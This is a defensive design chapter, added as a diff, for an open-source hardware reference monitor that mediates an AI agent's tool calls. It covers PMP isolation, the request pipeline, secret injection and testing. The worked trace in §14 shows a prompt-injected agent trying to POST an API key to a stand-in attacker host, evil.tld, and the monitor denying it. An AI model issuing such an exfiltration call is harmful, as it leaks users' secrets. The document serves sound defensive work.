@@ -1,0 +1,404 @@
+<title>The Redoubt Monitor</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Archivo:wght@600;700;800&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;1,400&family=IBM+Plex+Mono:wght@400;500;600&display=swap">
+<style>
+  :root{--bg:#F5F7F9;--surface:#FFFFFF;--surface-2:#EEF1F5;--ink:#14171C;--muted:#586274;--line:#C6CDD8;--accent:#0E7C86;--accent-soft:#0E7C8618;--allow:#1F7A46;--deny:#B3261E;--warn:#8A5A00;--code-bg:#EEF1F5;--code-ink:#1F2530;
+    --sans:"IBM Plex Sans",-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;--disp:"Archivo","IBM Plex Sans",sans-serif;--mono:"IBM Plex Mono",ui-monospace,"SF Mono",Menlo,monospace;}
+  @media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#0B0E13;--surface:#131922;--surface-2:#0F141C;--ink:#E7ECF2;--muted:#95A2B4;--line:#2C3745;--accent:#3EC3CE;--accent-soft:#3EC3CE1E;--allow:#57C684;--deny:#F26A5E;--warn:#E0A64A;--code-bg:#0E141D;--code-ink:#CFD8E3;}}
+  :root[data-theme="dark"]{--bg:#0B0E13;--surface:#131922;--surface-2:#0F141C;--ink:#E7ECF2;--muted:#95A2B4;--line:#2C3745;--accent:#3EC3CE;--accent-soft:#3EC3CE1E;--allow:#57C684;--deny:#F26A5E;--warn:#E0A64A;--code-bg:#0E141D;--code-ink:#CFD8E3;}
+  *{box-sizing:border-box}
+  body{background:var(--bg);color:var(--ink);font-family:var(--sans);line-height:1.66;font-size:16px;-webkit-text-size-adjust:100%}
+  .wrap{max-width:940px;margin:0 auto;padding-inline:20px}
+  .prose,p,li{max-width:74ch}
+  a{color:var(--accent)}
+  h1,h2,h3,h4{font-family:var(--disp);line-height:1.16;text-wrap:balance;font-weight:700}
+  h2{font-size:1.5rem;margin:2.8rem 0 .5rem;padding-top:1rem;border-top:1px solid var(--line)}
+  h2 .n{font-family:var(--mono);color:var(--accent);font-size:.9rem;min-width:2.4em;display:inline-block}
+  h3{font-size:1.1rem;margin:1.7rem 0 .3rem;color:var(--accent)}
+  h4{font-size:.98rem;margin:1.2rem 0 .2rem}
+  p{margin:.7rem 0}
+  code{font-family:var(--mono);font-size:.86em;background:var(--code-bg);color:var(--code-ink);padding:.1em .35em;border-radius:4px}
+  pre{font-family:var(--mono);background:var(--code-bg);color:var(--code-ink);border:1px solid var(--line);border-radius:8px;padding:14px 16px;overflow-x:auto;font-size:.8rem;line-height:1.5;margin:1rem 0}
+  pre code{background:none;padding:0}
+  figure{margin:1.6rem 0;background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:18px;overflow-x:auto}
+  figure svg{display:block;max-width:100%;height:auto;color:var(--ink)}
+  figcaption{font-size:.85rem;color:var(--muted);margin-top:.7rem;padding-top:.6rem;border-top:1px dashed var(--line)}
+  figure svg text{fill:currentColor}
+  .f-s1{fill:var(--surface)}.f-s2{fill:var(--surface-2)}.f-acc{fill:var(--accent-soft)}.f-none{fill:none}
+  .s-ln{stroke:var(--line)}.s-acc{stroke:var(--accent)}.s-cur{stroke:currentColor}.s-mut{stroke:var(--muted)}.s-den{stroke:var(--deny)}
+  .t-acc{fill:var(--accent)}.t-mut{fill:var(--muted)}.t-den{fill:var(--deny)}.mk{fill:currentColor}.mk-acc{fill:var(--accent)}.dash{stroke-dasharray:4 4}
+  table{border-collapse:collapse;width:100%;font-size:.83rem;margin:1rem 0}
+  .tblwrap{overflow-x:auto}
+  th,td{border:1px solid var(--line);padding:6px 9px;text-align:left;vertical-align:top}
+  th{background:var(--surface-2)}
+  .callout{background:var(--accent-soft);border-left:3px solid var(--accent);border-radius:6px;padding:12px 16px;margin:1.2rem 0;font-size:.94rem}
+  .eyebrow{font-family:var(--mono);font-size:.72rem;letter-spacing:.18em;text-transform:uppercase;color:var(--accent);margin:0 0 .4rem}
+  .lede{font-size:1.14rem;max-width:70ch}
+  ul.tight{padding-left:1.2rem} ul.tight li{margin:.3rem 0}
+  dl dt{font-family:var(--mono);font-size:.85rem;color:var(--accent);margin-top:.8rem}
+  dl dd{margin:.15rem 0 0;padding-left:1rem}
+  .rej{border:1px solid var(--line);border-radius:8px;padding:.2rem 14px;margin:.7rem 0;background:var(--surface)}
+  .rej h4{color:var(--deny)}
+  .crumb{font-family:var(--mono);font-size:.75rem;color:var(--muted);margin:.6rem 0 0}
+  footer{margin:3rem 0 2rem;padding-top:1rem;border-top:1px solid var(--line);font-size:.82rem;color:var(--muted)}
+</style>
+
+<div class="wrap">
+<p class="crumb">Redoubt Component Manual · Chapter — the Monitor  ·  (exemplar depth; other components to match)</p>
+<p class="eyebrow">Component 09 · The trusted core</p>
+<h1 style="font-size:2.3rem;font-weight:800;margin:.2rem 0">The Monitor</h1>
+<p class="lede">The Monitor is the whole of Redoubt's trust. It is the guard at the one door: the only
+code that touches secrets or drives egress, the only code that decides whether an agent's requested
+effect happens. Everything else in the system exists to keep this component small, unbypassable, and
+correct. This chapter specifies it end to end — its position, its internal parts, how it executes,
+how a request travels through it, every failure it can take, the alternatives that were rejected, and
+how it is tested.</p>
+
+<h2><span class="n">1</span>Role &amp; responsibilities</h2>
+<p>In reference-monitor terms [Anderson 1972] the Monitor must be <b>always invoked</b>,
+<b>tamper-proof</b>, and <b>small enough to verify</b>. Concretely it owns five things no other
+component may touch:</p>
+<ol>
+<li><b>The verdict.</b> Given a structured request <code>(session, cap_handle, tool_id, args, labels)</code>,
+it decides ALLOW or a specific DENY, deterministically, with no model in the loop.</li>
+<li><b>Secrets.</b> Credentials live in a memory region only the Monitor can read; it injects them
+into effects but never returns them to a caller.</li>
+<li><b>Egress.</b> The network (ESP32) and storage (microSD) MMIO are mapped M-only; the physical
+act of sending or writing is performed by the Monitor alone.</li>
+<li><b>Policy.</b> It compiles and holds the decision tables the verdict is computed from.</li>
+<li><b>The hardware guard.</b> It programs and locks the PMP entries that make all of the above true.</li>
+</ol>
+<p>Everything the Monitor does not need to do, it does not do. It has no scheduler (that is Warden's
+job, §Warden), no device protocol stacks (drivers format payloads in untrusted U-mode), no dynamic
+memory on the request path, and no general-purpose interfaces. Each capability it lacks is one that
+cannot be turned against it — the discipline that keeps the trusted computing base within its
+≤2,500-line budget.</p>
+
+<h2><span class="n">2</span>Why the verdict lives in M-mode</h2>
+<p>RISC-V has three privilege modes: Machine (M) &gt; Supervisor (S) &gt; User (U). Redoubt places
+the Monitor in M-mode. This is not a stylistic choice; it is forced by the threat model, which
+assumes the layers above can be fully compromised — including, as a stretch goal (A5), the S-mode
+Warden microkernel.</p>
+<p>The property that makes M-mode load-bearing is <b>PMP</b> (Physical Memory Protection): a bank of
+machine-mode-only registers that whitelist which physical addresses S- and U-mode may access.
+Supervisor code cannot even read the PMP registers, let alone change them. So if the Monitor maps
+the SECRETS and EGRESS regions as reachable only from M and locks those entries at boot, then a
+totally-compromised Warden or compartment still <em>physically cannot</em> read a key or poke the
+network controller. The wall is enforced by the hardware address-check on every load and store, not
+by any software check that could be skipped.</p>
+<p>This mirrors two mature designs studied during architecture work: Apple's SPTM, a page-table
+monitor more privileged than the XNU kernel, and the Keystone/Sanctorum RISC-V security monitors,
+which run the entire TCB in M-mode and use PMP exactly this way. Redoubt reuses the pattern and
+narrows its purpose to a single mediated operation: the agent tool call.</p>
+<div class="callout"><b>Consequence for the rest of the system.</b> Because the trust boundary is a
+hardware privilege boundary, the large, bug-prone code — USB stacks, TLS, filesystem logic, the
+whole host — can live outside the TCB without weakening the guarantee. The Monitor only has to be
+right about the <em>small</em> authority-bearing step.</p></div>
+
+<h2><span class="n">3</span>Internal architecture</h2>
+<p>The Monitor is a set of small, single-purpose submodules wired in a fixed order. There is no
+plugin system and no dynamic dispatch on the request path; the call graph is a straight line, which
+is what lets us reason about worst-case time and about which code can touch what.</p>
+<figure>
+<svg viewBox="0 0 860 360" role="img" aria-label="Monitor internal architecture: a trap vector feeds a dispatcher, which for a mediate call runs parser, session/capability resolver, predicate engine, and flow engine — all reading the M-only policy and capability tables — then the egress performer and secret injector drive the egress MMIO and read the secrets store, and the audit logger appends to the log. A PMP manager and TRNG sit to the side, used at boot and by the performer.">
+  <defs><marker id="a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" class="mk"/></marker>
+        <marker id="aa" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" class="mk-acc"/></marker></defs>
+  <!-- entry -->
+  <rect x="14" y="150" width="96" height="44" rx="7" class="f-s2 s-ln"/><text x="62" y="170" text-anchor="middle" font-size="10">trap vector</text><text x="62" y="184" text-anchor="middle" font-size="9" class="t-mut">mtvec</text>
+  <rect x="130" y="150" width="90" height="44" rx="7" class="f-s2 s-ln"/><text x="175" y="176" text-anchor="middle" font-size="10">dispatcher</text>
+  <!-- pipeline -->
+  <g font-size="9">
+    <rect x="248" y="60" width="104" height="38" rx="6" class="f-s1 s-ln"/><text x="300" y="83" text-anchor="middle">parser</text>
+    <rect x="248" y="108" width="104" height="38" rx="6" class="f-s1 s-ln"/><text x="300" y="131" text-anchor="middle">resolver</text>
+    <rect x="248" y="156" width="104" height="38" rx="6" class="f-s1 s-ln"/><text x="300" y="179" text-anchor="middle">predicate eng.</text>
+    <rect x="248" y="204" width="104" height="38" rx="6" class="f-s1 s-ln"/><text x="300" y="227" text-anchor="middle">flow engine</text>
+    <rect x="248" y="252" width="104" height="44" rx="6" class="f-acc s-acc"/><text x="300" y="271" text-anchor="middle" class="t-acc">egress perform</text><text x="300" y="285" text-anchor="middle" class="t-acc">+ secret inject</text>
+  </g>
+  <!-- tables -->
+  <rect x="400" y="96" width="120" height="110" rx="7" class="f-none s-ln"/><text x="460" y="90" text-anchor="middle" font-size="9" class="t-mut">MON_DATA (M-only)</text>
+  <text x="460" y="120" text-anchor="middle" font-size="9">session table</text>
+  <text x="460" y="140" text-anchor="middle" font-size="9">capability spaces</text>
+  <text x="460" y="160" text-anchor="middle" font-size="9">policy tables</text>
+  <text x="460" y="180" text-anchor="middle" font-size="9">audit log</text>
+  <!-- secrets + egress -->
+  <rect x="560" y="120" width="120" height="40" rx="7" class="f-none s-ln"/><text x="620" y="144" text-anchor="middle" font-size="9">SECRETS (M-only)</text>
+  <rect x="560" y="250" width="120" height="48" rx="7" class="f-none s-acc"/><text x="620" y="270" text-anchor="middle" font-size="9" class="t-acc">EGRESS MMIO</text><text x="620" y="284" text-anchor="middle" font-size="8" class="t-mut">ESP32 · SD · TRNG</text>
+  <!-- side modules -->
+  <rect x="700" y="60" width="140" height="40" rx="7" class="f-s2 s-ln"/><text x="770" y="84" text-anchor="middle" font-size="9">PMP manager (boot)</text>
+  <rect x="700" y="300" width="140" height="40" rx="7" class="f-s2 s-ln"/><text x="770" y="324" text-anchor="middle" font-size="9">TRNG + health tests</text>
+  <rect x="400" y="252" width="120" height="44" rx="7" class="f-s1 s-ln"/><text x="460" y="271" text-anchor="middle" font-size="9">audit logger</text><text x="460" y="285" text-anchor="middle" font-size="8" class="t-mut">hash chain</text>
+  <!-- arrows -->
+  <g class="s-cur" stroke-width="1.3" marker-end="url(#a)">
+    <line x1="110" y1="172" x2="128" y2="172"/>
+    <line x1="220" y1="168" x2="246" y2="120"/>
+    <line x1="300" y1="98" x2="300" y2="106"/><line x1="300" y1="146" x2="300" y2="154"/>
+    <line x1="300" y1="194" x2="300" y2="202"/><line x1="300" y1="242" x2="300" y2="250"/>
+    <line x1="352" y1="127" x2="398" y2="140" class="s-mut dash"/>
+    <line x1="352" y1="175" x2="398" y2="160" class="s-mut dash"/>
+    <line x1="352" y1="223" x2="398" y2="170" class="s-mut dash"/>
+  </g>
+  <g class="s-acc" stroke-width="1.5" marker-end="url(#aa)">
+    <line x1="352" y1="274" x2="558" y2="140"/>
+    <line x1="352" y1="278" x2="558" y2="274"/>
+  </g>
+  <line x1="352" y1="285" x2="398" y2="278" class="s-cur" stroke-width="1.2" marker-end="url(#a)"/>
+</svg>
+<figcaption><b>Monitor internal architecture.</b> Solid teal arrows are the only paths that reach
+SECRETS and EGRESS — and they originate solely in the perform step. Dashed lines are table reads.
+The PMP manager runs at boot; the TRNG feeds the performer and handle randomization.</figcaption>
+</figure>
+
+<h3>3.1 Submodule reference</h3>
+<dl>
+<dt>trap vector</dt><dd>The value in <code>mtvec</code>. On any trap into M-mode it saves the minimal
+integer context to the M stack, reads <code>mcause</code>, and routes: <code>ecall-from-U (8)</code>
+and <code>ecall-from-S (9)</code> go to the dispatcher; anything else (an unexpected fault reaching
+M) is a Monitor bug and goes to the fault handler (§11).</dd>
+<dt>dispatcher</dt><dd>Reads the opcode in <code>a7</code>. Exactly five opcodes are legal
+(<code>MEDIATE</code>, <code>SESSION_OPEN/REVOKE/CLOSE</code>, <code>ATTEST_READ</code>); every other
+value returns <code>DENY_MALFORMED</code> without touching any table. This is the entire attack
+surface of the trusted core.</dd>
+<dt>request parser</dt><dd>Validates that <code>[ptr, ptr+len)</code> lies wholly inside the
+SHARED_REQ region, checks the <code>magic</code> and <code>ver</code>, and decodes the fixed header
+plus up to <code>MAX_ARGS</code> TypedArgs into a stack-allocated <code>Request</code>. It copies the
+bytes it needs out of SHARED_REQ (which U-mode can still write) into Monitor-private memory before
+any use — a defense against time-of-check/time-of-use races (§11).</dd>
+<dt>session &amp; capability resolver</dt><dd>Bounds-checks <code>session_id</code> into the session
+table and <code>cap_handle</code> into that session's capability space, then checks the capability's
+<code>epoch</code> against the session's. A missing session, an out-of-range handle, an Empty slot,
+or a stale epoch all resolve to <code>DENY_NO_CAP</code>/<code>DENY_REVOKED</code>. It returns a
+copy of the 16-byte <code>Cap</code>, never a pointer the later stages could follow into shared memory.</dd>
+<dt>predicate engine</dt><dd>Runs the compiled clause array for the capability's <code>pred_ref</code>
+against the typed arguments. Each clause is a <code>(field_selector, op, operand_ref)</code> triple;
+the engine dereferences operands into the interned constant pool in MON_DATA. It is a fixed loop
+bounded by <code>MAX_CLAUSES</code>; there is no regex engine, no backtracking, no user-supplied code.</dd>
+<dt>flow engine</dt><dd>Checks the request's input labels against the capability's flow rule: it
+rejects a SECRET value entering a sink the rule does not clear, and computes the output label for the
+result. See the Information-Flow chapter for the lattice.</dd>
+<dt>egress performer</dt><dd>The only submodule that touches EGRESS MMIO. It formats the final effect
+using the (untrusted) driver's prepared payload, then applies the capability's secret injection and
+issues the hardware operation with a bounded poll and a watchdog. It is also the only caller of the
+secret injector.</dd>
+<dt>secret injector</dt><dd>Given a <code>secret_ref</code>, reads the key from SECRETS, splices it
+into the effect at the site the policy named (e.g., an <code>Authorization</code> header), and
+zeroizes any temporary copy before returning. It exposes no path that returns key bytes to the
+performer's result.</dd>
+<dt>audit logger</dt><dd>Appends a hash-chained entry (§Assurance) for every verdict, allow or deny.
+The chain head is the attestation output.</dd>
+<dt>PMP manager</dt><dd>Runs once at boot: programs <code>pmpaddr*/pmpcfg*</code>, sets lock/Smepmp
+bits, and fences. Not on the request path.</dd>
+<dt>TRNG + health</dt><dd>Ring-oscillator entropy with NIST SP 800-90B start-up and continuous
+health tests; supplies randomness for capability-handle salting and session keys.</dd>
+</dl>
+
+<h2><span class="n">4</span>Memory &amp; stack layout</h2>
+<p>The Monitor occupies three PMP regions, all M-only: <code>MON_CODE</code> (execute), <code>MON_DATA</code>
+(read/write), and <code>SECRETS</code> (read/write, additionally denied to M-mode reads outside the
+secret injector's window where Smepmp allows). Its working memory is entirely static:</p>
+<pre><code>MON_DATA layout (fixed at build/boot):
+  session_table   : [Session; MAX_SESSIONS]        // small, e.g. 8
+  cspaces         : [[Cap; 32]; MAX_SESSIONS]       // 16 B * 32 * 8 = 4 KiB
+  policy          : { pred_table, flow_table, const_pool }   // compiled, read-only after boot
+  audit_ring      : [Entry; AUDIT_N]                // append-only ring
+  m_stack         : fixed stack + guard sub-region
+</code></pre>
+<p>The M-mode stack sits below a PMP sub-region with no permissions, so a stack overflow faults
+immediately rather than corrupting <code>policy</code> or <code>cspaces</code>. There is deliberately
+no heap: every request-time allocation is a stack temporary of known size, so the Monitor cannot fail
+for lack of memory and has no allocator to attack.</p>
+
+<h2><span class="n">5</span>Execution &amp; concurrency model</h2>
+<ul class="tight">
+<li><b>Single-threaded, run-to-completion.</b> The Monitor handles one call at a time and returns
+before accepting another. Warden serializes requests into SHARED_REQ. There is therefore no
+in-Monitor concurrency, no locks, and no data races inside the TCB — a large class of kernel bugs
+simply cannot occur here.</li>
+<li><b>Bounded time.</b> Stages 1–5 are O(<code>n_args</code> × <code>clauses</code>) ≤ 64 iterations
+with no allocation. The Monitor always terminates, which the reference-monitor property requires.</li>
+<li><b>Blocking only at egress, with a watchdog.</b> The one place the Monitor may wait on external
+hardware is the egress performer (ESP32/SD). It uses a bounded poll; if the device does not complete
+within the watchdog window it returns <code>ERR_TIMEOUT</code> rather than spinning, so a wedged
+peripheral cannot hang the trusted core.</li>
+<li><b>Interrupts.</b> During a mediation, M-mode interrupts are masked except the watchdog timer;
+the Monitor is not itself preemptible. Timer interrupts that drive Warden's scheduler are taken only
+after the Monitor returns to S/U.</li>
+</ul>
+
+<h2><span class="n">6</span>Entry &amp; exit mechanics</h2>
+<p>A request enters as an <code>ecall</code> from U-mode. The hardware traps to M-mode: it sets
+<code>mepc</code> to the instruction after the <code>ecall</code>, records <code>mcause=8</code>, and
+jumps to <code>mtvec</code>. The trap vector:</p>
+<pre><code>on_trap:
+  csrrw  sp_m, mscratch, sp_m      # switch to the M-mode stack
+  save   a0..a7, ra to m_stack     # minimal integer context
+  csrr   t0, mcause
+  bne    t0, ECALL_U/S, fault      # only ecalls are expected
+  jal    dispatch                  # -> mediate()/session_*()/attest()
+  restore a0(=status), a1(=len)    # results per the ABI
+  csrr   t1, mepc; addi t1,t1,0    # mepc already points past ecall
+  restore ra, sp_m
+  mret                              # return to the caller at mepc</code></pre>
+<p>The caller (Endpoint, via Warden) reads <code>a0</code>/<code>a1</code> as the status and response
+length. Because the Monitor runs to completion with interrupts masked, the context it must save is
+minimal and fixed.</p>
+
+<h2><span class="n">7</span>The pipeline, stage by stage</h2>
+<p>Below, each stage names the data it reads, the failures it can raise, and the edge cases it must
+handle. The reference algorithm is in the main manual; here is the reasoning behind each step.</p>
+<h4>Stage 1 — bounds &amp; format</h4>
+<p>Everything downstream trusts the parsed <code>Request</code>, so this stage is the airlock. It
+proves the buffer is inside SHARED_REQ (a compromised U-mode could pass a pointer into WARDEN or
+MON_DATA — the check refuses it), that counts are within <code>MAX_ARGS</code>, and that the total
+length is within <code>MAX_REQ</code>. It then <em>copies</em> the request into Monitor-private
+memory: if it parsed in place, U-mode could rewrite the bytes between the predicate check and the
+perform step (a TOCTOU attack). Failure: <code>DENY_MALFORMED</code>.</p>
+<h4>Stage 2 — session &amp; capability resolution</h4>
+<p>The handle the host sent is just an integer; this stage turns it into authority — or refuses. The
+epoch check is what makes revocation instantaneous: when a session is revoked its epoch is bumped, so
+every handle it ever handed out now points at a capability whose epoch no longer matches, and all
+resolve to <code>DENY_REVOKED</code> without walking any list. Edge cases: handle to an Empty slot,
+handle out of range, session already closed — all deny.</p>
+<h4>Stage 3 — tool binding</h4>
+<p>A capability authorizes one tool. Binding is checked before the (more expensive) predicate step so
+that a capability for <code>file.read</code> presented for <code>http.request</code> is rejected
+cheaply. Failure: <code>DENY_TOOL</code>.</p>
+<h4>Stage 4 — typed-argument predicate</h4>
+<p>This is where most attacks die. The engine evaluates the compiled clauses over the <em>typed</em>
+fields, not over re-parsed text — so the class of bugs where a filter and the consumer disagree about
+parsing (the <code>%2e</code> host-confusion SSRF, for instance) cannot occur: the Monitor reads
+<code>url.host</code> from the structured argument the same way the effect will use it. Failure
+carries the index of the first failing clause in the reason detail. Edge cases: an argument of the
+wrong <code>tag</code> for the clause's field selector is a <code>DENY_MALFORMED</code>, not a silent
+pass.</p>
+<h4>Stage 5 — information flow</h4>
+<p>Predicates constrain the shape of a call; the flow check constrains what <em>data</em> may ride
+it. A request that puts a SECRET-labeled value into the body of an allowed host is stopped here even
+though the host passes stage 4. This is the second, independent net under the exfiltration attack.</p>
+<h4>Stage 6 — perform &amp; inject</h4>
+<p>Only now, after all checks pass, does anything leave the chip. The performer injects the bound
+secret (which the agent never saw), issues the hardware op under the watchdog, labels the result
+<code>UNTRUSTED</code>, and hands it back. If the device errors or times out, the caller gets
+<code>ERR_EGRESS</code>/<code>ERR_TIMEOUT</code> — never a partial or unlabeled result.</p>
+
+<h2><span class="n">8</span>Secret subsystem internals</h2>
+<p>Secrets are the asset most worth stealing, so their handling is the most conservative path in the
+Monitor:</p>
+<ul class="tight">
+<li><b>At rest:</b> keys live in the SECRETS region, loaded at boot from an M-only QSPI area into
+M-only RAM; the load staging buffer is zeroized immediately after.</li>
+<li><b>In use:</b> the secret injector is the sole reader. It splices the key into the effect at the
+policy-named site and holds the plaintext only in a stack temporary for the duration of one perform,
+zeroizing on the way out.</li>
+<li><b>Never returned:</b> there is no ABI, and no code path in the performer, that copies key bytes
+into a response. This is the same principle as Apple's SEP key-wrapping — callers get <em>use</em> of
+a key, not the key.</li>
+<li><b>Labeling:</b> injected secrets carry the SECRET confidentiality label, so the flow engine can
+prevent a policy that would route them to a public sink.</li>
+</ul>
+
+<h2><span class="n">9</span>PMP programming performed at boot</h2>
+<p>Before Warden ever runs, the PMP manager writes the region table and locks it. Order matters: the
+Monitor programs the most-privileged-denying entries first and issues a fence, so there is never a
+window in which a region is both populated and unguarded.</p>
+<pre><code>for (i, region) in REGION_TABLE:            # BROM, MON_CODE, MON_DATA, SECRETS, EGRESS, WARDEN, SHARED
+    write pmpaddr[i] = top_of(region) >> 2  # TOR upper bound
+    cfg[i] = A=TOR | perms(region) | (Smepmp? deny-M : L=lock)
+commit pmpcfg words; fence.i; sfence
+# from here, S/U accesses outside their granted regions fault in hardware</code></pre>
+
+<h2><span class="n">10</span>Boot responsibilities</h2>
+<p>Beyond PMP, the Monitor at boot: loads and zeroizes-after secrets; initializes and health-tests
+the TRNG; compiles the policy manifest into the read-only decision tables; sets <code>mtvec</code>
+and leaves <code>medeleg</code> such that S/U ecalls trap to M; then <code>mret</code>s to Warden.
+Its own image was already measured by the BROM (BLAKE2s) before control reached it — see the Boot
+chapter.</p>
+
+<h2><span class="n">11</span>Fault &amp; error policy</h2>
+<dl>
+<dt>Expected denials</dt><dd>The <code>DENY_*</code> codes are normal control flow, logged and
+signaled on the OLED/LED; the session continues.</dd>
+<dt>Egress failures</dt><dd><code>ERR_EGRESS</code>/<code>ERR_TIMEOUT</code> are returned to the caller;
+no retry is performed inside the Monitor (retry policy is the untrusted caller's business).</dd>
+<dt>Impossible faults</dt><dd>A load/store fault <em>reaching M-mode</em> means the Monitor itself
+touched something it shouldn't — a bug, not an attack. The fault handler logs a code, drives the OLED
+to a fail state, and halts. It never tries to continue in a possibly-corrupt state; a halted Redoubt
+is safe (no effects), a limping one is not.</dd>
+<dt>TOCTOU</dt><dd>Neutralized by copying the request out of shared memory in stage 1 before any check.</dd>
+<dt>Watchdog</dt><dd>Bounds the one blocking operation so a wedged peripheral cannot hang the TCB.</dd>
+</dl>
+
+<h2><span class="n">12</span>Invariants the Monitor maintains</h2>
+<ul class="tight">
+<li><b>I1 · Mediation.</b> No write to EGRESS MMIO occurs except from the perform step, after stages 1–5 returned ALLOW.</li>
+<li><b>I2 · Secret confinement.</b> Key bytes never appear in a response or in any region readable by S/U.</li>
+<li><b>I3 · No ambient authority.</b> A capability slot is non-Empty only if policy (or an attenuating derive) installed it.</li>
+<li><b>I4 · Monotone rights.</b> Every derived capability's authority is a subset of its parent's.</li>
+<li><b>I5 · Termination.</b> Every call returns within a fixed step bound (plus one watchdog window at egress).</li>
+<li><b>I6 · Tables immutable after boot.</b> <code>policy</code> is written once at boot and never again.</li>
+<li><b>I7 · Locked hardware.</b> PMP entries guarding T0 are locked before any T1/T2 instruction executes.</li>
+</ul>
+<p>These are the properties the verification plan (§Assurance) tests and that a future formal model
+would prove.</p>
+
+<h2><span class="n">13</span>Alternatives considered &amp; rejected</h2>
+<div class="rej"><h4>Put the verdict in the S-mode kernel</h4><p>Simpler (one privilege boundary), but
+then a Warden bug is a full bypass, violating A5. Rejected: the whole point is that the kernel is not
+the most-trusted thing.</p></div>
+<div class="rej"><h4>Use the MMU alone for isolation</h4><p>An MMU protects virtual mappings but is
+configured from S-mode; it cannot wall a region off from a compromised supervisor. PMP is
+M-only and is the correct primitive for the T0 wall. (The MMU is still useful <em>above</em> the wall
+for per-compartment U isolation.)</p></div>
+<div class="rej"><h4>Asynchronous / pipelined mediation for throughput</h4><p>Would introduce queues,
+buffering, and concurrency into the TCB — more code, locks, and race surface. v1 is correctness-first;
+egress latency dominates anyway. Rejected for v1.</p></div>
+<div class="rej"><h4>An LLM or classifier in the decision path</h4><p>Non-deterministic and
+attacker-influenceable — the exact failure the whole design avoids. The Monitor contains no model.</p></div>
+<div class="rej"><h4>A general/dynamic policy language (loops, callbacks)</h4><p>Would make the verdict
+Turing-complete and non-terminating in the worst case, and unauditable. The manifest is deliberately
+a total language.</p></div>
+<div class="rej"><h4>A heap in the Monitor</h4><p>Introduces allocator bugs and out-of-memory failure
+modes into the TCB. Rejected in favor of fixed-size static state.</p></div>
+
+<h2><span class="n">14</span>Worked trace</h2>
+<p>An agent, prompt-injected, calls <code>http.request(POST, https://evil.tld, body=API_KEY)</code>
+holding <code>cap_handle=3</code> (the <code>web</code> capability).</p>
+<pre><code>trap        mcause=8 → save ctx → dispatch(a7=MEDIATE)
+stage1      ptr∈SHARED_REQ ✓, magic ✓, n_args=3≤8 ✓ → copy Request in
+stage2      session 1 live; cspace[3]=Cap{Net, tool=http.request, epoch=E}; epoch matches ✓
+stage3      cap.tool_id == tool_id(http.request) ✓
+stage4      clause0 (url.scheme SCHEME_EQ https) ✓
+            clause1 (url.host HOST_IN_SET {api.example.com}) → "evil.tld" ✗
+            → DENY_ARG (clause 1)
+audit       append {seq, ts, sess=1, tool, DENY_ARG, arg_digest}; head hash advances
+signal      OLED "DENY_ARG host"; LED red
+return      a0=0x12 (DENY_ARG), a1=0    → no egress performed, secret untouched</code></pre>
+<p>Had the host instead targeted <code>api.example.com</code> with the key in the body, stage 4 would
+pass and stage 5 would raise <code>DENY_FLOW</code> on <code>deny-if body carries SECRET</code>. Two
+independent nets, both non-AI, both deterministic.</p>
+
+<h2><span class="n">15</span>Testing the Monitor</h2>
+<ul class="tight">
+<li><b>Unit</b> (host target): parser bounds &amp; TOCTOU copy, resolver epoch logic, predicate
+opcodes, flow lattice, PMP-address arithmetic.</li>
+<li><b>Property</b>: invariants I1–I7 as assertions/quickcheck-style properties over random requests.</li>
+<li><b>Verilator</b>: assert a PMP fault when S/U touch SECRETS/EGRESS (I7 at the hardware level).</li>
+<li><b>Containment suite</b> (QEMU): each §Threat attack asserts the exact <code>DENY_*</code> and that
+no egress occurred.</li>
+<li><b>Fuzz</b>: the parser and TypedArg decoder against <code>MAX_REQ</code> with a sanitizer build.</li>
+<li><b>TCB gate</b>: <code>tokei</code> ≤ 2,500 lines; <code>cargo-geiger</code> confirms one
+sanctioned <code>unsafe</code> module.</li>
+</ul>
+
+<h2><span class="n">16</span>Open questions (Monitor-specific)</h2>
+<ul class="tight">
+<li>Exact <code>MAX_SESSIONS</code>/<code>MAX_CLAUSES</code> given ECP5 RAM and the LoC budget.</li>
+<li>Whether the secret injector needs a constant-time splice to avoid a length side channel (deferred with the broader side-channel item).</li>
+<li>The precise watchdog window for ESP32 vs SD egress.</li>
+<li>Whether Smepmp is present in the chosen VexRiscv build, or the <code>L=1</code> fallback applies (affects §9).</li>
+</ul>
+
+<footer>Redoubt Component Manual · the Monitor · exemplar chapter. If this is the right depth, every
+other component (Isolation/PMP, Boot, Capabilities, Policy, IFC, Warden, Compartments, Sessions, Wire
+protocol, Egress, Assurance) will get a chapter of this shape. Open source (MIT).</footer>
+</div>
